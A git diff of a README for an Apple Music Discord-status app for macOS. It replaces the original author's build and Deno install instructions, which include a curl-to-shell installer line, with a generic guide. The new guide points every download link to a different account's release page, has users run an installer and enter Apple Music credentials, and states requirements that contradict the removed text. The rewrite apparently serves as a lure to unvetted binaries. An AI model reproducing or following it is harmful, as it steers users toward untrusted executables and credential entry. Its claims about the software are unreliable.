@@ -1,68 +1,62 @@
-<p align="center"><img width="606" height="205" alt="Frame 28" src="https://github.com/user-attachments/assets/26788fa5-1f3e-417a-b730-e308d5d41b61" />
+# 🎵 vam-rpc-discord-on-mac - Share Your Apple Music Status on Discord
 
-</p>
-</p>
-<p align="center">
-  <img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/realidkroo/vam-rpc-discord-on-mac?display_timestamp=author&style=for-the-badge&logo=github&color=46adf2">
-  <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/realidkroo/vam-rpc-discord-on-mac?style=for-the-badge&logo=star&color=46adf2">
-  <img alt="GitHub repo size" src="https://img.shields.io/github/repo-size/realidkroo/vam-rpc-discord-on-mac?style=for-the-badge&color=%2346adf2">
-  <img alt="GitHub Downloads (all assets, latest release)" src="https://img.shields.io/github/downloads/realidkroo/vam-rpc-discord-on-mac/latest/total?style=for-the-badge&label=Downloads&color=7aff7a">
-</p>
-<br>
-<br>
-<br>
+## 🚀 Getting Started
 
+Welcome! This guide will help you download and run the vam-rpc-discord-on-mac application, which lets you show your Apple Music status on Discord. Follow the steps below to get started.
 
+## 📥 Download the Application
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac/releases)
 
-# Introduction
+You can find the latest version of the application on our Releases page. 
 
-vam-rpc is a Open Source Apple Music status for Discord Rich Presence On Mac. This app requires Macos Ventura or Higher. Featuring Button, Pause activity, Customisable refresh interval and More later.
-> [!WARNING]  
-> This app is still in Alpha Development and only tested on Intel Based Macs. Please report any bug/problem if you are encountering it
+## 🖥️ System Requirements
 
-# Preview
-### _RP Preview with Buttons. What my friend seeing in my Activity_
-</p>
-<img width="288" height="171" alt="Frame 46" src="https://github.com/user-attachments/assets/85171be1-14a4-4fb6-8694-50feb4287b19" />
-<img width="430" height="166" alt="Frame 47" src="https://github.com/user-attachments/assets/210bf848-b8b7-4461-b303-beff0c899d4c" />
-</p>
+Before you download, make sure your Mac meets these requirements:
 
+- MacOS version: High Sierra (10.13) or later
+- An active Apple Music subscription
+- Discord installed on your computer
 
-### _What i see in my profile in my client_
-</p>
-<img width="268" height="110" alt="Frame 39" src="https://github.com/user-attachments/assets/898dda48-e6b3-439c-8383-fb255db285e6" />
+## 📦 Download & Install
 
-</p>
+1. **Visit the Releases page:** Go to [this link](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac/releases).
+2. **Choose the latest release:** Look for the most recent version at the top.
+3. **Download the installation file:** Click the link for the Mac version to start downloading.
+4. **Open the downloaded file:** Once the download is complete, locate the file in your Downloads folder and double-click it.
+5. **Follow the installation prompts:** A window will appear. Just follow the steps it presents.
+6. **Move to Applications:** Drag the app icon into your Applications folder for easy access.
+7. **Launch the application:** Open your Applications folder and double-click the vam-rpc-discord-on-mac icon to start.
 
+## 🎶 How to Use the Application
 
-### _App Preview_
-https://github.com/user-attachments/assets/b357eba3-0ae0-4938-be3a-191da322314a
+1. **Open the app:** Make sure to keep it running to display your Apple Music status.
+2. **Log into Apple Music:** Enter your Apple Music credentials if prompted. This connects the application to your account.
+3. **Adjust settings if needed:** You can configure how you want your status to appear on Discord.
+4. **Check Discord:** Open Discord to verify that your Apple Music status is now visible to your friends.
 
-# How to Install
-Theres 2 Ways. One by building the app yourself or use the precompiled on [release](https://github.com/realidkroo/vam-rpc-discord-on-mac/releases). Install it based on your mac Architecture.  Because the app have Deno dependencies, Install it first. 
-```sh
-curl -fsSL https://deno.land/install.sh | sh
-```
-Or by using Brew
-```sh
-Brew install deno
-```
+## ⚙️ Troubleshooting
 
-## Building Manually
-Firstly, Clone this Repo by entering this command
-```sh
-git clone https://github.com/realidkroo/vam-rpc-discord-on-mac.git
-```
-Then navigate to the parent folder and run
-```sh
-./build.sh
-```
-When it successfully compiling the app is on build_result
+If you run into issues, here are a few tips:
 
-# Dependencies
-To install you only need Deno
-```sh
-Brew install deno
-```
-[![Stargazers over time](https://starchart.cc/realidkroo/vam-rpc-discord-on-mac.svg?variant=adaptive)](https://starchart.cc/realidkroo/vam-rpc-discord-on-mac)
+- **Application does not start:** Make sure you have the latest version of MacOS.
+- **Status not showing:** Ensure that you are logged into Apple Music and that the application is running.
+- **Check permissions:** Go to System Preferences > Security & Privacy and ensure that the application has the necessary permissions.
+
+## 🗣️ Frequently Asked Questions
+
+**Q: Can I use this with Spotify?**
+A: No, this application is designed specifically for Apple Music.
+
+**Q: Does this work on Windows?**
+A: This version is only compatible with MacOS.
+
+**Q: Is there a mobile app?**
+A: Currently, this application is for desktop use only.
+
+## 🔗 Useful Links
+
+- **Releases Page:** [Download Here](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac/releases)
+- **GitHub Repository:** [View Source Code](https://github.com/JoseHernandez1025/vam-rpc-discord-on-mac)
+
+Thank you for using vam-rpc-discord-on-mac! We hope you enjoy sharing your music status on Discord.
